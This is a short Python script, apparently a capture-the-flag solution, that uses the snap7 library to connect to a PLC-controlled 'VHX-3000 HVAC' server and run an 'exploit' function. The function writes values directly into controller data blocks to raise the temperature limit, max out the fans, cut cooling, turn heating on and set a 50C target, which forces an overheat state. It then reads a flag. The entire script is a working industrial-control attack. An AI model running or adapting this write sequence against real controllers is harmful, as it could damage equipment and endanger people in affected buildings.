import snap7

import time



def read(db_num, offset, size):

    try:

        data = client.db_read(db_num, offset, size)

        text = data.decode('utf-8', errors='ignore').rstrip('\x00')

        print(f"DB{db_num} [offset {offset}, size {size}]: {text}")

        return text

    except Exception as e:

        print(f"Error reading DB{db_num}: {e}")

        return None



def write(db_num, offset, value):

    value_bytes = value.encode('utf-8')

    max_size = 50 - offset

    if len(value_bytes) > max_size:

        print(f"Warning: Value '{value}' truncated to {max_size} bytes")

        value_bytes = value_bytes[:max_size]

    

    try:

        client.db_write(db_num, offset, value_bytes)

        print(f"Wrote '{value}' to DB{db_num} at offset {offset}")

    except Exception as e:

        print(f"Error writing to DB{db_num}: {e}")



# Connect to VHX-3000 server

client = snap7.client.Client()

try:

    client.connect("192.168.1.64", 0, 1, 1338) # IP of the server and port

    if not client.get_connected():

        print("Connection to VHX-3000 failed")

        exit(1)

    print("Connected to VHX-3000 HVAC Server.")

except Exception as e:

    print(f"Connection error: {e}")

    exit(1)



# Exploit sequence

def exploit():

    print("\n=== Exploiting VHX-3000 HVAC System ===")

    

    size = 50

    

    print("\nReading initial states:")

    read(1, 0, size)  

    read(2, 0, size)  

    read(3, 0, size)  

    read(4, 0, size)  

    read(5, 0, size)  



    # Step 2: Execute writes in order

    print("\nExecuting overheat sequence:")

    write(1, 29, "MAX:65")       

    time.sleep(1)                 

    write(2, 0, "FAN:99%")      

    time.sleep(1)

    write(3, 8, "COOL:10%")       

    time.sleep(1)

    write(5, 0, "HEAT:ON ")      

    time.sleep(1)

    write(1, 0, "TARGET-TEMP:50C")              

    time.sleep(5)

    

    print("\nReading states:")

    read(1, 0, size)  # DB1 full

    read(2, 0, size)  # DB2 full

    read(3, 0, size)  # DB3 full

    read(4, 0, 100)  # DB4 full FLAG :)

    read(5, 0, size)  # DB5 full





if __name__ == "__main__":

    exploit()

    